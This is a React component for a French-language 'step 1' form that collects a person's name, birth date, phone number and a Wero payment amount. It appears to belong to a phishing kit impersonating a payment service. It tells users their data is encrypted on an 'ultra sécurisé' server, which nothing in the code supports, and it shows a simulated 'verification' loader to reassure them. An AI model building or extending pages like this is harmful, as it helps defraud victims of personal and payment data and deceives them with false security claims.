import React, { useState } from 'react';
import { FormContainer } from './ui/FormContainer';
import { Input } from './ui/Input';
import { formatBirthDate } from '../utils/dateFormatter';
import { Loader2 } from 'lucide-react';

interface PersonalInfoFormProps {
  onSubmit: (formData: PersonalInfoData) => Promise<boolean>;
}

export interface PersonalInfoData {
  firstName: string;
  lastName: string;
  birthDate: string;
  phoneNumber: string;
  amount: string;
}

export function PersonalInfoForm({ onSubmit }: PersonalInfoFormProps) {
  const [formData, setFormData] = useState<PersonalInfoData>({
    firstName: '',
    lastName: '',
    birthDate: '',
    phoneNumber: '',
    amount: ''
  });
  const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
  const [showLoader, setShowLoader] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setStatus('sending');

    try {
      const success = await onSubmit(formData);
      if (!success) throw new Error('Failed to submit form');
      
      setStatus('success');
      setShowLoader(true);
      
      // Simulate processing time before moving to next step
      setTimeout(() => {
        setShowLoader(false);
        setStatus('idle');
      }, 2000);
    } catch (error) {
      setStatus('error');
      setTimeout(() => setStatus('idle'), 3000);
    }
  };

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    
    setFormData(prev => ({
      ...prev,
      [name]: name === 'birthDate' ? formatBirthDate(value) : value
    }));
  };

  // Show loader overlay when processing
  if (showLoader) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-yellow-200 to-yellow-100 pt-20">
        <div className="max-w-xl mx-auto px-4 py-8">
          <div className="bg-white rounded-2xl shadow-xl p-8">
            <div className="flex flex-col items-center justify-center py-16">
              <Loader2 className="w-12 h-12 animate-spin text-yellow-500 mb-6" />
              <h2 className="text-2xl font-bold text-gray-800 mb-4">
                Traitement en cours...
              </h2>
              <p className="text-gray-600 text-center max-w-md">
                Vos informations sont en cours de vérification. Veuillez patienter quelques instants.
              </p>
              <div className="mt-8 w-full max-w-xs">
                <div className="bg-gray-200 rounded-full h-2">
                  <div className="bg-yellow-500 h-2 rounded-full animate-pulse" style={{ width: '70%' }}></div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    );
  }

  return (
    <FormContainer
      title="Informations personnelles"
      subtitle="Veuillez renseigner vos informations personnelles pour continuer."
      step="ÉTAPE 1"
    >
      <p className="text-sm text-gray-600 italic mb-8">
        NB : Vos données sont cryptées et stockées sur un serveur ultra sécurisé à l'abri d'un tiers.
      </p>

      <form onSubmit={handleSubmit} className="space-y-6">
        <Input
          label="Veuillez saisir votre prénom"
          name="firstName"
          value={formData.firstName}
          onChange={handleChange}
          placeholder="Prénom"
          required
        />

        <Input
          label="Veuillez saisir votre nom"
          name="lastName"
          value={formData.lastName}
          onChange={handleChange}
          placeholder="Nom de famille"
          required
        />

        <Input
          label="Veuillez saisir votre date de naissance"
          name="birthDate"
          value={formData.birthDate}
          onChange={handleChange}
          placeholder="JJ/MM/AAAA"
          maxLength={10}
          required
        />

        <Input
          label="Veuillez saisir votre numéro de téléphone"
          name="phoneNumber"
          value={formData.phoneNumber}
          onChange={handleChange}
          placeholder="Numéro de téléphone"
          required
        />

        <Input
          label="Veuillez saisir le montant du Wero"
          name="amount"
          value={formData.amount}
          onChange={handleChange}
          placeholder="Montant du Wero"
          required
        />

        <button
          type="submit"
          disabled={status === 'sending'}
          className="w-full bg-black text-white font-semibold py-4 rounded-lg transition duration-200 hover:bg-gray-800 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          {status === 'sending' ? 'Traitement en cours...' : 'CONTINUER'}
        </button>

        {status === 'success' && !showLoader && (
          <div className="text-green-600 text-center bg-green-50 p-3 rounded-lg">
            Informations envoyées avec succès!
          </div>
        )}
        {status === 'error' && (
          <div className="text-red-600 text-center bg-red-50 p-3 rounded-lg">
            Échec de l'envoi. Veuillez réessayer.
          </div>
        )}
      </form>
    </FormContainer>
  );
}